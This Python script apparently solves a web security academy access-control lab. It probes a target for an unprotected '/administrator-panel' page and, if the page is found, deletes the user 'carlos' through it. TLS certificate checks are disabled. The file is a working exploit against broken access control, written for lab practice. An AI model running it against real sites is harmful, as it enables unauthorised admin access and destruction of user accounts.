#####################
#    Libraries      #
#####################
import requests
import sys
import urllib3
import argparse
import gc

#####################
#    Variables      #
#####################

## Disable requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

## Setup Proxies to future debugs
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser(prog=f'\n[+] WebAcademy Access Control: Lab 1'
                                ,description="Description: Accesses the misconfigured Admin Panel and Delete Carlos' user"
                                ,epilog='----------------------- END ---------------------------')
parser.add_argument('-u', metavar ='--url', action='store', dest='url', type=str, required=True, help="Target's URL")

args = parser.parse_args()

#####################
#    Functions      #
#####################
def delete_user(url,s):
    print('[+] Deleting Carlos user...')
    delete_carlos_url = url + '/delete?username=carlos'
    r = s.get(delete_carlos_url, verify=False, proxies=proxies)
    if r.status_code == 200:
        print('[+] Carlos\' user deleted! You rocked the lab!')

    else:
        print('[-] Could not delete user.')
        gc.collect()
        sys.exit(-1) 

def access_admin_panel(url,s):
    print("[+] Trying to find the admin panel")
    admin_panel_url = url + '/administrator-panel'
    r = s.get(admin_panel_url, verify=False, proxies=proxies)
    if r.status_code == 200:
        print('[+] Found the administrator panel!')
        delete_user(admin_panel_url,s)
    else:
        print('[-] Administrator panel not found.')
        print('[-] Exiting the script...')
        gc.collect()
        sys.exit(-1)   

def main():
    if len(sys.argv) != 3:
        print(f"[+] Usage: {sys.argv[0]} -u <lab's url>")
        print(f"[+] Example: {sys.argv[0]} -u www.example.com")
        gc.collect()
        sys.exit(-1)
    
    url = args.url.rstrip('/')
    s = requests.Session()
    access_admin_panel(url,s)


if __name__ == "__main__":
    main()